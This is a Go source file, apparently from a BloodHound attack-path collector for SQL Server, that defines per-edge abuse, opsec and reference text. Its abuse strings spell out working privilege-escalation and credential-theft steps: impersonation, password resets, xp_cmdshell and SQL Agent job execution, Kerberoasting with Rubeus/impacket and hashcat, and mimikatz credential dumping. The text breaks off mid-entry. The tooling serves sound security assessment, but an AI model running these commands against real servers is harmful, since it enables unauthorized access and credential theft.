// Package bloodhound provides BloodHound OpenGraph JSON output generation.
// This file contains edge property generators that match the PowerShell version.
package bloodhound

// EdgeProperties contains the documentation and metadata for an edge
type EdgeProperties struct {
	Traversable  bool   `json:"traversable"`
	General      string `json:"general"`
	WindowsAbuse string `json:"windowsAbuse"`
	LinuxAbuse   string `json:"linuxAbuse"`
	Opsec        string `json:"opsec"`
	References   string `json:"references"`
}

// EdgeContext provides context for generating edge properties
type EdgeContext struct {
	SourceName    string
	SourceType    string
	TargetName    string
	TargetType    string
	SQLServerName string
	DatabaseName  string
	Permission    string
	IsFixedRole   bool
}

// GetEdgeProperties returns the properties for a given edge kind
func GetEdgeProperties(kind string, ctx *EdgeContext) map[string]interface{} {
	props := make(map[string]interface{})

	generator, ok := edgePropertyGenerators[kind]
	if !ok {
		// Default properties for unknown edge types
		props["traversable"] = true
		props["general"] = "Relationship exists between source and target."
		return props
	}

	edgeProps := generator(ctx)
	props["traversable"] = edgeProps.Traversable
	props["general"] = edgeProps.General
	props["windowsAbuse"] = edgeProps.WindowsAbuse
	props["linuxAbuse"] = edgeProps.LinuxAbuse
	props["opsec"] = edgeProps.Opsec
	props["references"] = edgeProps.References

	return props
}

// IsTraversableEdge returns whether an edge type is traversable by default
func IsTraversableEdge(kind string) bool {
	switch kind {
	case EdgeKinds.MemberOf,
		EdgeKinds.IsMappedTo,
		EdgeKinds.Impersonate,
		EdgeKinds.ImpersonateAnyLogin,
		EdgeKinds.AlterAnyLogin,
		EdgeKinds.AlterAnyServerRole,
		EdgeKinds.ControlServer,
		EdgeKinds.ControlDB,
		EdgeKinds.ChangePassword,
		EdgeKinds.AddMember,
		EdgeKinds.TakeOwnership,
		EdgeKinds.ExecuteAsOwner,
		EdgeKinds.CanExecuteOnServer,
		EdgeKinds.CanExecuteOnDB,
		EdgeKinds.GrantAnyPermission,
		EdgeKinds.GrantAnyDBPermission:
		return true
	default:
		return false
	}
}

// edgePropertyGenerators maps edge kinds to their property generators
var edgePropertyGenerators = map[string]func(*EdgeContext) EdgeProperties{

	EdgeKinds.MemberOf: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The " + ctx.SourceType + " is a member of the " + ctx.TargetType + ". This membership grants all permissions associated with the target role to the source principal.",
			WindowsAbuse: "When connected to the server/database as " + ctx.SourceName + ", you have all permissions granted to the " + ctx.TargetName + " role.",
			LinuxAbuse:   "When connected to the server/database as " + ctx.SourceName + ", you have all permissions granted to the " + ctx.TargetName + " role.",
			Opsec: `Role membership is a static relationship. Actions performed using role permissions are logged based on the specific operation, not the role membership itself.
To view current role memberships at server level:
    SELECT r.name AS RoleName, m.name AS MemberName
    FROM sys.server_role_members rm
    JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
    JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id
    ORDER BY r.name, m.name;
To view current role memberships at database level:
    SELECT r.name AS RoleName, m.name AS MemberName
    FROM sys.database_role_members rm
    JOIN sys.database_principals r ON rm.role_principal_id = r.principal_id
    JOIN sys.database_principals m ON rm.member_principal_id = m.principal_id
    ORDER BY r.name, m.name;`,
			References: `- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles
- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles
- https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-server-role-members-transact-sql
- https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql`,
		}
	},

	EdgeKinds.IsMappedTo: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The " + ctx.SourceType + " is mapped to this " + ctx.TargetType + " in the " + ctx.DatabaseName + " database. When connected as the login, the user automatically has database access.",
			WindowsAbuse: "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " and switch to the " + ctx.DatabaseName + " database to act as the database user.",
			LinuxAbuse:   "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " and switch to the " + ctx.DatabaseName + " database to act as the database user.",
			Opsec:        "Login to database user mappings are standard SQL Server behavior. Switching databases is normal activity.",
			References:   "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/create-a-database-user",
		}
	},

	EdgeKinds.Contains: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The " + ctx.SourceType + " contains the " + ctx.TargetType + ".",
			WindowsAbuse: "This is a containment relationship showing hierarchy.",
			LinuxAbuse:   "This is a containment relationship showing hierarchy.",
			Opsec:        "N/A - this is an informational edge showing object hierarchy.",
			References:   "",
		}
	},

	EdgeKinds.Owns: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The " + ctx.SourceType + " owns the " + ctx.TargetType + ". Ownership provides full control over the object, including the ability to grant permissions, change properties, and in most cases, impersonate or control access.",
			WindowsAbuse: "As the owner of " + ctx.TargetName + ", connect to " + ctx.SQLServerName + " and exercise full control over the owned object.",
			LinuxAbuse:   "As the owner of " + ctx.TargetName + ", connect to " + ctx.SQLServerName + " and exercise full control over the owned object.",
			Opsec:        "Ownership changes are logged in SQL Server. Actions taken as owner are logged based on the specific operation.",
			References:   `- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/ownership-and-user-schema-separation-in-sql-server`,
		}
	},

	EdgeKinds.ControlServer: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The " + ctx.SourceType + " has CONTROL SERVER permission on the SQL Server, granting full administrative control equivalent to sysadmin.",
			WindowsAbuse: "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " and execute any administrative command. You can create logins, modify permissions, and access all databases.",
			LinuxAbuse:   "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " and execute any administrative command. You can create logins, modify permissions, and access all databases.",
			Opsec:        "CONTROL SERVER grants sysadmin-equivalent permissions. All administrative actions are logged. Consider using more targeted permissions if possible.",
			References: `- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine
- https://learn.microsoft.com/en-us/sql/t-sql/statements/grant-server-permissions-transact-sql`,
		}
	},

	EdgeKinds.ControlDB: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The " + ctx.SourceType + " has CONTROL permission on the " + ctx.DatabaseName + " database, granting full administrative control equivalent to db_owner.",
			WindowsAbuse: "Connect to " + ctx.SQLServerName + ", switch to the " + ctx.DatabaseName + " database, and execute any administrative command within the database scope.",
			LinuxAbuse:   "Connect to " + ctx.SQLServerName + ", switch to the " + ctx.DatabaseName + " database, and execute any administrative command within the database scope.",
			Opsec:        "CONTROL on database grants db_owner-equivalent permissions within the database. All database administrative actions are logged.",
			References:   "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine",
		}
	},

	EdgeKinds.Impersonate: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The " + ctx.SourceType + " can impersonate the " + ctx.TargetType + ", executing commands with the target's permissions.",
			WindowsAbuse: "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " and execute: EXECUTE AS LOGIN = '" + ctx.TargetName + "'; to impersonate the target login.",
			LinuxAbuse:   "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " and execute: EXECUTE AS LOGIN = '" + ctx.TargetName + "'; to impersonate the target login.",
			Opsec: `Impersonation is logged in SQL Server audit logs. To check current execution context:
    SELECT SYSTEM_USER, USER_NAME(), ORIGINAL_LOGIN();
To revert impersonation:
    REVERT;`,
			References: `- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql
- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/impersonate-a-user`,
		}
	},

	EdgeKinds.ImpersonateAnyLogin: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The " + ctx.SourceType + " has IMPERSONATE ANY LOGIN permission, allowing impersonation of any server login.",
			WindowsAbuse: "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " and execute: EXECUTE AS LOGIN = '<target_login>'; to impersonate any login on the server.",
			LinuxAbuse:   "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " and execute: EXECUTE AS LOGIN = '<target_login>'; to impersonate any login on the server.",
			Opsec:        "IMPERSONATE ANY LOGIN is a powerful permission. All impersonation attempts are logged in the SQL Server audit log.",
			References:   "- https://learn.microsoft.com/en-us/sql/t-sql/statements/grant-server-permissions-transact-sql",
		}
	},

	EdgeKinds.ChangePassword: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The " + ctx.SourceType + " can change the password of the " + ctx.TargetType + " without knowing the current password.",
			WindowsAbuse: "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " and execute: ALTER LOGIN [" + ctx.TargetName + "] WITH PASSWORD = 'NewPassword123!';",
			LinuxAbuse:   "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " and execute: ALTER LOGIN [" + ctx.TargetName + "] WITH PASSWORD = 'NewPassword123!';",
			Opsec: `Password changes are logged in SQL Server audit logs and Windows Security event log. Event IDs:
- SQL Server: Audit Login Change Password Event
- Windows: 4724 (An attempt was made to reset an account's password)`,
			References: `- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-login-transact-sql
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49758`,
		}
	},

	EdgeKinds.AddMember: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The " + ctx.SourceType + " can add members to the " + ctx.TargetType + ", granting the new member the permissions assigned to the role.",
			WindowsAbuse: "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " and execute: ALTER SERVER ROLE [" + ctx.TargetName + "] ADD MEMBER [target_login]; or sp_addsrvrolemember for server roles, or ALTER ROLE/sp_addrolemember for database roles.",
			LinuxAbuse:   "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " and execute: ALTER SERVER ROLE [" + ctx.TargetName + "] ADD MEMBER [target_login]; or sp_addsrvrolemember for server roles, or ALTER ROLE/sp_addrolemember for database roles.",
			Opsec:        "Role membership changes are logged in SQL Server audit logs. Adding members to privileged roles like sysadmin or db_owner generates high-visibility events.",
			References: `- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-server-role-transact-sql
- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-role-transact-sql`,
		}
	},

	EdgeKinds.Alter: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  false, // Non-traversable by default
			General:      "The " + ctx.SourceType + " has ALTER permission on the " + ctx.TargetType + ".",
			WindowsAbuse: "ALTER permission allows modifying the target object's properties but may not grant full control.",
			LinuxAbuse:   "ALTER permission allows modifying the target object's properties but may not grant full control.",
			Opsec:        "ALTER operations are logged in SQL Server audit logs.",
			References:   "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine",
		}
	},

	EdgeKinds.Control: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  false, // Non-traversable by default
			General:      "The " + ctx.SourceType + " has CONTROL permission on the " + ctx.TargetType + ".",
			WindowsAbuse: "CONTROL permission grants ownership-like permissions on the target object.",
			LinuxAbuse:   "CONTROL permission grants ownership-like permissions on the target object.",
			Opsec:        "CONTROL operations are logged in SQL Server audit logs.",
			References:   "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine",
		}
	},

	EdgeKinds.ChangeOwner: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The " + ctx.SourceType + " can take ownership of the " + ctx.TargetType + " via TAKE OWNERSHIP permission.",
			WindowsAbuse: "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " and execute: ALTER AUTHORIZATION ON [" + ctx.TargetName + "] TO [" + ctx.SourceName + "];",
			LinuxAbuse:   "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " and execute: ALTER AUTHORIZATION ON [" + ctx.TargetName + "] TO [" + ctx.SourceName + "];",
			Opsec:        "Ownership changes are logged in SQL Server audit logs.",
			References:   "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-authorization-transact-sql",
		}
	},

	EdgeKinds.AlterAnyLogin: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  false,
			General:      "The " + ctx.SourceType + " has ALTER ANY LOGIN permission on the server, allowing modification of any login.",
			WindowsAbuse: "This permission allows changing passwords, enabling/disabling logins, and modifying login properties for any login on the server.",
			LinuxAbuse:   "This permission allows changing passwords, enabling/disabling logins, and modifying login properties for any login on the server.",
			Opsec:        "ALTER ANY LOGIN is a sensitive permission. All login modifications are logged.",
			References:   "- https://learn.microsoft.com/en-us/sql/t-sql/statements/grant-server-permissions-transact-sql",
		}
	},

	EdgeKinds.AlterAnyServerRole: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  false,
			General:      "The " + ctx.SourceType + " has ALTER ANY SERVER ROLE permission, allowing modification of any server role.",
			WindowsAbuse: "This permission allows creating, altering, and dropping server roles, as well as adding/removing members from roles.",
			LinuxAbuse:   "This permission allows creating, altering, and dropping server roles, as well as adding/removing members from roles.",
			Opsec:        "ALTER ANY SERVER ROLE is a sensitive permission. All role modifications are logged.",
			References:   "- https://learn.microsoft.com/en-us/sql/t-sql/statements/grant-server-permissions-transact-sql",
		}
	},

	EdgeKinds.LinkedTo: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The SQL Server has a linked server connection to " + ctx.TargetName + ", allowing queries across servers.",
			WindowsAbuse: "Connect to " + ctx.SQLServerName + " and query the linked server: SELECT * FROM [" + ctx.TargetName + "].master.sys.databases; or EXEC [" + ctx.TargetName + "].master.dbo.sp_configure;",
			LinuxAbuse:   "Connect to " + ctx.SQLServerName + " and query the linked server: SELECT * FROM [" + ctx.TargetName + "].master.sys.databases; or EXEC [" + ctx.TargetName + "].master.dbo.sp_configure;",
			Opsec:        "Linked server queries are logged on both the source and target servers. Network traffic between servers may be monitored.",
			References: `- https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine
- https://www.netspi.com/blog/technical-blog/network-penetration-testing/how-to-hack-database-links-in-sql-server/`,
		}
	},

	EdgeKinds.ExecuteAsOwner: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The database is TRUSTWORTHY and owned by a privileged login. Stored procedures can execute as the owner with elevated privileges.",
			WindowsAbuse: "Create a stored procedure in the trustworthy database with EXECUTE AS OWNER to escalate privileges to the database owner's server-level permissions.",
			LinuxAbuse:   "Create a stored procedure in the trustworthy database with EXECUTE AS OWNER to escalate privileges to the database owner's server-level permissions.",
			Opsec:        "Stored procedure creation and execution are logged. TRUSTWORTHY databases are a known security risk.",
			References: `- https://learn.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property
- https://www.netspi.com/blog/technical-blog/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/`,
		}
	},

	EdgeKinds.IsTrustedBy: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The database has the TRUSTWORTHY property enabled, which allows stored procedures to access resources outside the database.",
			WindowsAbuse: "Code executing in this database can access server-level resources if the database owner has appropriate permissions.",
			LinuxAbuse:   "Code executing in this database can access server-level resources if the database owner has appropriate permissions.",
			Opsec:        "TRUSTWORTHY is a security setting that should be disabled unless required. Its status can be queried from sys.databases.",
			References:   "- https://learn.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property",
		}
	},

	EdgeKinds.ServiceAccountFor: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The " + ctx.SourceType + " is the service account running the SQL Server service for " + ctx.TargetName + ".",
			WindowsAbuse: "Compromise of the service account grants access to the SQL Server process and potentially to stored credentials and data.",
			LinuxAbuse:   "Compromise of the service account grants access to the SQL Server process and potentially to stored credentials and data.",
			Opsec:        "Service account changes require restarting the SQL Server service.",
			References:   "- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions",
		}
	},

	EdgeKinds.HostFor: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The computer hosts the SQL Server instance.",
			WindowsAbuse: "Administrative access to the host computer provides access to the SQL Server process, data files, and potentially stored credentials.",
			LinuxAbuse:   "Administrative access to the host computer provides access to the SQL Server process, data files, and potentially stored credentials.",
			Opsec:        "Host-level access bypasses SQL Server authentication logging.",
			References:   "",
		}
	},

	EdgeKinds.ExecuteOnHost: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The SQL Server can execute commands on the host computer through xp_cmdshell or other mechanisms.",
			WindowsAbuse: "If xp_cmdshell is enabled, execute: EXEC xp_cmdshell 'whoami'; to run OS commands as the SQL Server service account.",
			LinuxAbuse:   "If xp_cmdshell is enabled, execute: EXEC xp_cmdshell 'whoami'; to run OS commands as the SQL Server service account.",
			Opsec:        "xp_cmdshell execution is logged if enabled. Process creation on the host is logged by the OS.",
			References:   "- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql",
		}
	},

	EdgeKinds.GrantAnyPermission: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The " + ctx.SourceType + " can grant ANY server permission to any login (securityadmin role capability).",
			WindowsAbuse: "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " and grant elevated permissions: GRANT CONTROL SERVER TO [target_login];",
			LinuxAbuse:   "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " and grant elevated permissions: GRANT CONTROL SERVER TO [target_login];",
			Opsec:        "Permission grants are logged in SQL Server audit logs. Granting high-privilege permissions generates security alerts in monitored environments.",
			References:   "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles",
		}
	},

	EdgeKinds.GrantAnyDBPermission: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The " + ctx.SourceType + " can grant ANY database permission to any user (db_securityadmin role capability).",
			WindowsAbuse: "Connect to " + ctx.SQLServerName + ", switch to the database, and grant elevated permissions: GRANT CONTROL TO [target_user];",
			LinuxAbuse:   "Connect to " + ctx.SQLServerName + ", switch to the database, and grant elevated permissions: GRANT CONTROL TO [target_user];",
			Opsec:        "Permission grants are logged in SQL Server audit logs.",
			References:   "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles",
		}
	},

	EdgeKinds.Connect: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  false,
			General:      "The " + ctx.SourceType + " has CONNECT SQL permission, allowing it to connect to the SQL Server.",
			WindowsAbuse: "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " using sqlcmd, SQL Server Management Studio, or other SQL client tools.",
			LinuxAbuse:   "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " using impacket mssqlclient.py, sqlcmd, or other SQL client tools.",
			Opsec: `SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events.
Log events are generated by default for failed login attempts and can be viewed by executing EXEC sp_readerrorlog 0, 1, 'Login';), but successful login events are not logged by default.`,
			References: `- https://learn.microsoft.com/en-us/sql/relational-databases/policy-based-management/server-public-permissions?view=sql-server-ver16
- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17
- https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16`,
		}
	},

	EdgeKinds.ConnectAnyDatabase: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  false,
			General:      "The " + ctx.SourceType + " has CONNECT ANY DATABASE permission, allowing it to connect to any database on the SQL Server.",
			WindowsAbuse: "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " and access any database without needing explicit database user mappings.",
			LinuxAbuse:   "Connect to " + ctx.SQLServerName + " as " + ctx.SourceName + " and access any database without needing explicit database user mappings.",
			Opsec:        "Database access is logged if auditing is enabled. This permission bypasses normal database user mapping requirements.",
			References:   "- https://learn.microsoft.com/en-us/sql/t-sql/statements/grant-server-permissions-transact-sql",
		}
	},

	EdgeKinds.AlterAnyAppRole: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  false,
			General:      "WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage. The ALTER ANY APPLICATION ROLE permission on a database allows the source " + ctx.SourceType + " to change the password for an application role, activate the application role with the new password, and execute actions with the application role's permissions.",
			WindowsAbuse: "WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage.",
			LinuxAbuse:   "WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage.",
			Opsec:        "This attack should not be performed as it will cause an immediate outage for the application using this role.",
			References:   "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/application-roles?view=sql-server-ver17",
		}
	},

	EdgeKinds.AlterAnyDBRole: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  false,
			General:      "The " + ctx.SourceType + " has ALTER ANY ROLE permission on the database, allowing it to create, alter, or drop any user-defined database role and add or remove members from roles.",
			WindowsAbuse: "Connect to " + ctx.SQLServerName + ", switch to the " + ctx.DatabaseName + " database, and create/modify roles: CREATE ROLE [attacker_role]; ALTER ROLE [db_owner] ADD MEMBER [attacker_user];",
			LinuxAbuse:   "Connect to " + ctx.SQLServerName + ", switch to the " + ctx.DatabaseName + " database, and create/modify roles: CREATE ROLE [attacker_role]; ALTER ROLE [db_owner] ADD MEMBER [attacker_user];",
			Opsec:        "Role modifications are logged in SQL Server audit logs. Adding members to privileged roles generates security events.",
			References:   "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-role-transact-sql",
		}
	},

	EdgeKinds.HasDBScopedCred: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  false,
			General:      "The database contains a database-scoped credential that authenticates as the target domain account when accessing external resources. There is no guarantee the credentials are currently valid. Unlike server-level credentials, these are contained within the database and portable with database backups.",
			WindowsAbuse: "The credential could be crackable if it has a weak password and is used automatically when accessing external data sources from this database. Specific abuse for database-scoped credentials requires further research.",
			LinuxAbuse:   "The credential is used automatically when accessing external data sources from this database. Specific abuse for database-scoped credentials requires further research.",
			Opsec:        "Database-scoped credential usage is logged when accessing external resources. These credentials are included in database backups, making them portable. The credential secret is encrypted and cannot be retrieved directly.",
			References: `- https://learn.microsoft.com/en-us/sql/t-sql/statements/create-database-scoped-credential-transact-sql
- https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/`,
		}
	},

	EdgeKinds.HasMappedCred: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  false,
			General:      "The SQL login has a credential mapped via ALTER LOGIN ... WITH CREDENTIAL. This credential is used automatically when the login accesses certain external resources. There is no guarantee the credentials are currently valid.",
			WindowsAbuse: "The credential could be crackable if it has a weak password and is used automatically when the login accesses certain external resources. The credential can be abused through SQL Agent jobs using proxy accounts.",
			LinuxAbuse:   "The credential could be crackable if it has a weak password and is used automatically when the login accesses certain external resources.",
			Opsec:        "Credential usage is logged when accessing external resources. The actual credential password is encrypted and cannot be retrieved. Credential mapping changes are not logged in the default trace.",
			References: `- https://learn.microsoft.com/en-us/sql/t-sql/statements/create-credential-transact-sql
- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/credentials-database-engine
- https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/`,
		}
	},

	EdgeKinds.HasProxyCred: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  false,
			General:      "The SQL principal is authorized to use a SQL Agent proxy account that runs job steps as a domain account. There is no guarantee the credentials are currently valid.",
			WindowsAbuse: `Create and execute a SQL Agent job using the proxy:
    EXEC msdb.dbo.sp_add_job @job_name = 'ProxyTest';
    EXEC msdb.dbo.sp_add_jobstep
        @job_name = 'ProxyTest',
        @step_name = 'Step1',
        @subsystem = 'CmdExec',
        @command = 'whoami > C:\temp\proxy_user.txt',
        @proxy_name = 'ProxyName';
    EXEC msdb.dbo.sp_start_job @job_name = 'ProxyTest';`,
			LinuxAbuse: `Create and execute a SQL Agent job using the proxy:
    EXEC msdb.dbo.sp_add_job @job_name = 'ProxyTest';
    EXEC msdb.dbo.sp_add_jobstep
        @job_name = 'ProxyTest',
        @step_name = 'Step1',
        @subsystem = 'CmdExec',
        @command = 'whoami',
        @proxy_name = 'ProxyName';
    EXEC msdb.dbo.sp_start_job @job_name = 'ProxyTest';`,
			Opsec:      "SQL Agent job execution is logged in msdb job history tables and Windows Application event log.",
			References: `- https://learn.microsoft.com/en-us/sql/ssms/agent/create-a-sql-server-agent-proxy
- https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/`,
		}
	},

	EdgeKinds.ServiceAccountFor: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The domain account is the service account running the SQL Server instance. This account has full control over the SQL Server and can access data in all databases.",
			WindowsAbuse: `From a domain-joined machine as the service account (or with valid credentials):
    - If xp_cmdshell is enabled, execute OS commands as the service account
    - Access all databases and data without restrictions
    - If the SQL instance is running as a domain account, the cleartext credentials can be dumped from LSA secrets with mimikatz sekurlsa::logonpasswords`,
			LinuxAbuse: `From a Linux machine with valid credentials:
    - Connect to SQL Server using impacket mssqlclient.py
    - Access all databases and data without restrictions
    - Use the service account for lateral movement in the domain`,
			Opsec:      "Service account access is logged like any other connection. Actions performed as sysadmin are logged in SQL Server audit logs.",
			References: `- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions
- https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/`,
		}
	},

	EdgeKinds.HasLogin: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The domain account has a SQL Server login that is enabled and can connect to the SQL Server. This allows authentication to SQL Server using the account's credentials.",
			WindowsAbuse: "Connect to " + ctx.SQLServerName + " using Windows authentication as the domain account. Use sqlcmd, SQL Server Management Studio, or other SQL client tools.",
			LinuxAbuse:   "Connect to " + ctx.SQLServerName + " using Kerberos authentication with the domain account. Use impacket mssqlclient.py with the -k flag for Kerberos.",
			Opsec:        "SQL Server login connections are logged if login auditing is enabled. Failed logins are always logged by default.",
			References: `- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/create-a-login
- https://learn.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode`,
		}
	},

	EdgeKinds.GetTGS: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The service account has an SPN registered for the MSSQL service. Any authenticated domain user can request a TGS (Kerberos service ticket) for this SPN, which can be used for Kerberoasting attacks if the service account has a weak password.",
			WindowsAbuse: `Request a TGS and attempt to crack the service account password:
    # Using Rubeus
    Rubeus.exe kerberoast /spn:MSSQLSvc/server.domain.com:1433

    # Using PowerView
    Get-DomainSPNTicket -SPN "MSSQLSvc/server.domain.com:1433"

    Then crack the ticket offline with hashcat or john.`,
			LinuxAbuse: `Request a TGS and attempt to crack the service account password:
    # Using impacket
    GetUserSPNs.py domain.com/user:password -request -outputfile hashes.txt

    Then crack the ticket offline with hashcat:
    hashcat -m 13100 hashes.txt wordlist.txt`,
			Opsec:      "TGS requests are logged in Windows Event Log 4769 (Kerberos Service Ticket Operations). Multiple TGS requests for SQL SPNs may indicate Kerberoasting.",
			References: `- https://www.netspi.com/blog/technical-blog/network-pentesting/extracting-service-account-passwords-with-kerberoasting/
- https://attack.mitre.org/techniques/T1558/003/`,
		}
	},

	EdgeKinds.GetAdminTGS: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The service account has an SPN registered and runs the SQL Server with administrative privileges (sysadmin). Compromising this service account grants full control over the SQL Server instance.",
			WindowsAbuse: `Request a TGS and attempt to crack the service account password:
    # Using Rubeus
    Rubeus.exe kerberoast /spn:MSSQLSvc/server.domain.com:1433

    After cracking the password, connect to SQL Server as sysadmin.`,
			LinuxAbuse: `Request a TGS and attempt to crack the service account password:
    # Using impacket
    GetUserSPNs.py domain.com/user:password -request -outputfile hashes.txt

    After cracking the password, connect to SQL Server using impacket mssqlclient.py with sysadmin privileges.`,
			Opsec:      "TGS requests are logged in Windows Event Log 4769. This is a high-value target as it provides admin access to the SQL Server.",
			References: `- https://www.netspi.com/blog/technical-blog/network-pentesting/extracting-service-account-passwords-with-kerberoasting/
- https://attack.mitre.org/techniques/T1558/003/`,
		}
	},

	EdgeKinds.LinkedAsAdmin: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The source SQL Server has a linked server connection to the target SQL Server where the remote login has sysadmin, securityadmin, CONTROL SERVER, or IMPERSONATE ANY LOGIN privileges. This enables full administrative control of the remote SQL Server through linked server queries.",
			WindowsAbuse: `Execute commands on the remote server with admin privileges:
